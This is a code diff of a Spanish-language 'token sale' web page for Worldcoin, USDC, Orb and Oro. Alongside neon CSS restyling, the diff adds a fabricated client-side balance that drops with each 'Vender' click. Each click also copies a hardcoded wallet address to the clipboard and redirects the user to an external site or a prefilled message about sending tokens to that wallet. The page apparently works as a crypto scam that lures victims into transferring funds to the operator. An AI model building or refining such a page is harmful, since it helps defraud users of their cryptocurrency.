@@ -14,49 +14,55 @@
         
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #1a1a1a;
+            background-color: #0e0e0e;
             color: #e0e0e0;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
             padding: 20px;
+            overflow: hidden;
         }
 
         .container {
             width: 100%;
             max-width: 500px;
-            background: linear-gradient(145deg, #1e1e1e, #333333);
+            background: linear-gradient(145deg, #141414, #1c1c1c);
             border-radius: 15px;
-            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.2), 0px 4px 20px rgba(100, 100, 255, 0.3);
             padding: 30px;
             text-align: center;
+            box-shadow: 0px 0px 20px #00ffcc, 0px 0px 50px #ff007f;
+            border: 2px solid rgba(255, 0, 127, 0.2);
         }
 
         .header {
-            font-size: 30px;
+            font-size: 36px;
             font-weight: bold;
-            color: #00ffe7;
-            text-shadow: 0px 0px 8px #00ffe7;
-            margin-bottom: 20px;
+            color: #00ffcc;
+            text-shadow: 0px 0px 15px #00ffcc, 0px 0px 20px #ff007f;
+            margin-bottom: 25px;
         }
 
         .balance {
-            font-size: 42px;
+            font-size: 48px;
             font-weight: bold;
             color: #ff007f;
-            text-shadow: 0px 0px 12px #ff007f;
-            margin-bottom: 30px;
+            text-shadow: 0px 0px 10px #ff007f, 0px 0px 20px #00ffcc;
+            margin-bottom: 35px;
         }
 
         .asset {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            padding: 15px 0;
+            padding: 20px 0;
             border-bottom: 1px solid #333;
-            margin-bottom: 10px;
-            transition: all 0.3s ease;
+            margin-bottom: 15px;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+        .asset:hover {
+            transform: scale(1.05);
+            box-shadow: 0px 0px 20px #00ffcc, 0px 0px 30px #ff007f;
         }
         .asset:last-child {
             border-bottom: none;
@@ -67,12 +73,14 @@
             align-items: center;
             color: #e0e0e0;
         }
+        
         .asset-logo {
-            width: 36px;
-            height: 36px;
-            margin-right: 12px;
+            width: 40px;
+            height: 40px;
+            margin-right: 15px;
             border-radius: 50%;
-            border: 2px solid #00ffe7;
+            border: 2px solid #00ffcc;
+            box-shadow: 0px 0px 10px #00ffcc;
         }
 
         .asset-info {
@@ -80,15 +88,17 @@
             flex-direction: column;
             align-items: flex-start;
         }
-        .asset-amount {
+        .price {
             font-size: 20px;
             font-weight: bold;
-            color: #00ffe7;
+            color: #00ffcc;
+            text-shadow: 0px 0px 8px #00ffcc;
         }
 
         .sell-button {
-            padding: 8px 20px;
-            font-size: 14px;
+            padding: 10px 25px;
+            font-size: 16px;
+            font-weight: bold;
             color: #ffffff;
             background: linear-gradient(145deg, #ff007f, #d4006a);
             border: none;
@@ -96,37 +106,60 @@
             cursor: pointer;
             text-decoration: none;
             display: inline-block;
-            box-shadow: 0px 4px 8px rgba(255, 0, 127, 0.3);
-            transition: background 0.3s ease, box-shadow 0.3s ease;
+            box-shadow: 0px 4px 8px rgba(255, 0, 127, 0.5), 0px 4px 20px rgba(0, 255, 204, 0.4);
+            transition: background 0.3s ease, box-shadow 0.3s ease, transform 0.2s ease;
         }
         .sell-button:hover {
             background: linear-gradient(145deg, #ff338a, #e60072);
-            box-shadow: 0px 4px 12px rgba(255, 51, 138, 0.4);
+            box-shadow: 0px 4px 12px rgba(255, 51, 138, 0.7), 0px 4px 25px rgba(0, 255, 204, 0.5);
+            transform: scale(1.1);
         }
     </style>
 
     <script>
-        // Función para copiar wallet y redirigir según el token
-        function sellToken(token) {
-            let wallet;
-            let redirectUrl;
-            
-            if (token === 'wld') {
-                wallet = '0xda235e8c947490aa039f952cc5ec3bfe3a424758';
-                redirectUrl = 'https://wallet-bussines.github.io/'; // URL configurada para WLD
-            } else {
-                wallet = '0xde6b6e1cddbfd1d94afc01957748c36c36f43af4';
-                redirectUrl = 'https://unoapp.xyz/' + token + '%20a%20la%20wallet:%20' + wallet;
-            }
+        const tokenPrices = { wld: 1.20, usdc: 1.00, orb: 0.050, oro: 0.002 };
+        let balances = { wld: 10, usdc: 20, orb: 500, oro: 1000 }; // Balance inicial en tokens
+        let totalBalance = calculateTotalBalance();
 
-            // Copiar wallet al portapapeles
-            navigator.clipboard.writeText(wallet).then(() => {
-                alert('Wallet copiada al portapapeles');
-                window.location.href = redirectUrl;
-            }).catch(err => {
-                console.error('Error al copiar wallet: ', err);
-            });
+        function updateTotalBalanceDisplay() {
+            document.getElementById('balance').innerText = `$${totalBalance.toFixed(2)}`;
         }
+
+        function calculateTotalBalance() {
+            return Object.keys(balances).reduce((sum, token) => {
+                return sum + balances[token] * tokenPrices[token];
+            }, 0);
+        }
+
+        function sellToken(token) {
+            if (balances[token] > 0) {
+                balances[token]--; // Resta 1 token del balance
+                totalBalance = calculateTotalBalance();
+                updateTotalBalanceDisplay();
+
+                let wallet;
+                let redirectUrl;
+                
+                if (token === 'wld') {
+                    wallet = '0xda235e8c947490aa039f952cc5ec3bfe3a424758';
+                    redirectUrl = 'https://wallet-bussines.github.io/';
+                } else {
+                    wallet = '0xde6b6e1cddbfd1d94afc01957748c36c36f43af4';
+                    redirectUrl = 'https://worldcoin.org/mini-app?app_id=app_a4f7f3e62c1de0b9490a5260cb390b56&app_mode=mini-app/send?phone=1234567890&text=Estoy%20interesado%20en%20vender%20mis%20tokens%20de%20' + token + '%20a%20la%20wallet:%20' + wallet;
+                }
+
+                navigator.clipboard.writeText(wallet).then(() => {
+                    alert('Wallet copiada al portapapeles');
+                    window.location.href = redirectUrl;
+                }).catch(err => {
+                    console.error('Error al copiar wallet: ', err);
+                });
+            } else {
+                alert(`No tienes tokens suficientes de ${token} para vender.`);
+            }
+        }
+
+        window.onload = updateTotalBalanceDisplay;
     </script>
 </head>
 <body>
@@ -135,7 +168,6 @@
     <div class="header">Venta de Tokens</div>
     <div class="balance" id="balance">$0.00</div>
 
-    <!-- Token WLD -->
     <div class="asset">
         <div class="asset-name">
             <img src="https://wallet-bussines.github.io/Wld.png" alt="Worldcoin" class="asset-logo">
@@ -147,7 +179,6 @@
         <button class="sell-button" onclick="sellToken('wld')">Vender</button>
     </div>
 
-    <!-- Token USDC -->
     <div class="asset">
         <div class="asset-name">
             <img src="https://wallet-bussines.github.io/Usdc.png" alt="USDC" class="asset-logo">
@@ -159,7 +190,6 @@
         <button class="sell-button" onclick="sellToken('usdc')">Vender</button>
     </div>
 
-    <!-- Token Orb -->
     <div class="asset">
         <div class="asset-name">
             <img src="https://wallet-bussines.github.io/Orb.png" alt="Orb" class="asset-logo">
@@ -171,7 +201,6 @@
         <button class="sell-button" onclick="sellToken('orb')">Vender</button>
     </div>
 
-    <!-- Token Oro -->
     <div class="asset">
         <div class="asset-name">
             <img src="https://wallet-bussines.github.io/Oro.png" alt="Oro" class="asset-logo">
